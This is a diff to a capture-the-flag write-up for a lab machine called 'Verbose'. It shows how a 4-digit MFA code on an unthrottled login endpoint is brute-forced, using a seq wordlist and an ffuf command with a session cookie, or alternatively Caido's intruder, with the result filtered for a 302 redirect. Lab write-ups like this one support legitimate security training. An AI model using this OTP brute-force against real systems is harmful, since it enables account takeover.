@@ -121,15 +121,25 @@ Submitting `admin`'s credentials hits a second factor: a 4-digit numeric OTP del
 
 ![Admin login — 4-digit MFA prompt](<../.gitbook/assets/verbose_admin_mfa_prompt.png>)
 
-The keyspace is exactly 10,000 combinations (0000–9999) and the endpoint imposes no rate limiting or lockout policy. We capture the MFA submission request to confirm the parameter name and session cookie structure:
+The keyspace is exactly 10,000 combinations (0000–9999) and the endpoint imposes no rate limiting or lockout policy. We capture the MFA submission request in Caido to identify the `code=` parameter and extract the session cookie:
 
 ![Caido — captured MFA submission request](<../.gitbook/assets/verbose_burp_admin_login_capture.png>)
 
-We generate a zero-padded numeric wordlist and brute-force the `code=` parameter with `ffuf`, passing the `session` cookie obtained from the admin login step:
+We generate a zero-padded numeric wordlist, then use Caido's intruder to spray the `code=` parameter sequentially from `0000` to `9999`:
 
 ```bash
 seq -w 0000 9999 > numlist.txt
 ```
+
+![Caido — MFA spray configured with numlist](<../.gitbook/assets/verbose_ffuf_mfa_bruteforce.png>)
+
+Filtering responses by status code, a single `302 Found` redirect stands out — code `6196` — while all 9,999 other attempts return `200`.
+
+![Caido — 302 redirect isolates code 6196](<../.gitbook/assets/verbose_ffuf_mfa_302_found.png>)
+
+> 💡 **Author's Note:** The MFA code `6196` is instance-specific — it will differ on each machine reset. The attack methodology (spray 0000–9999, filter for `302`) remains constant regardless of the target value.
+
+**Alternative — ffuf:** If a proxy intruder is unavailable, the same attack runs directly from the terminal. Pass `-t 3` to avoid overwhelming the server, and `-fc 200,500` to filter noise:
 
 ```bash
 ffuf -X POST -w numlist.txt -u http://verbose.hsm/mfa \
@@ -139,35 +149,10 @@ ffuf -X POST -w numlist.txt -u http://verbose.hsm/mfa \
   -fc 200,500 -t 3
 ```
 
-**Flag notes:**
-- `-fc 200,500` — filters failed attempts (200 = wrong code page, 500 = server error under load); the valid code returns a `302` redirect
-- `-t 3` — low thread count to reduce server stress; drop further if 500 responses dominate
-
-![ffuf — MFA brute-force running](<../.gitbook/assets/verbose_ffuf_mfa_bruteforce.png>)
-
 ```
 # Console Output
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : POST
- :: URL              : http://verbose.hsm/mfa
- :: Wordlist         : FUZZ: /home/jhaxx/CTFs/HackSmarter/OSCP_Path/Linux_boxes/Verbose/numlist.txt
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Header           : Cookie: session=eyJtZmFfdXNlciI6ImFkbWluIiwic2Vzc2lvbl9pZCI6IjdkNzQ5M2U3LTI0OWEtNDVjZS05MGU3LTk4MGM1MzQzYWQ4ZSJ9.ajMEQw.KKH9JyZvGejQ6vmp23uRcFeifvk
- :: Data             : code=FUZZ
- :: Filter           : Response status: 200,500
- :: Threads          : 3
-________________________________________________
-
 6196                    [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 107ms]
 ```
-
-A single `302 Found` response isolates code `6196` from 9,999 failures.
-
-![ffuf — unique 302 redirect for code 6196](<../.gitbook/assets/verbose_ffuf_mfa_302_found.png>)
-
-> 💡 **Author's Note:** The MFA code `6196` is instance-specific — it will differ on each machine reset. The attack methodology (brute-force 0000–9999, filter for `302`) remains constant regardless of the target value.
 
 Submitting the code authenticates us as `admin`:
 
